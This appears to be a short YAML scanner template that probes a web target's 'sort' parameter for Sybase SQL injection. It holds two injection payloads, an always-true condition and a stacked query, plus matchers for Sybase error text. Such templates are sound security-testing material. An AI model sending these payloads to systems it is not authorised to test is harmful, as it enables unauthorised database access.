id: sqli3-sybase-12
name: 'SQLi sybase prefix #11 in sort'
severity: high
type: active
tags:
  - sqli
  - injection
  - sybase
description: 'Triggers sybase error via sort'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sort:
        - '1'' OR ''1''=''1'' /*'
        - '1''; SELECT 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Sybase'
          - 'Adaptive Server'
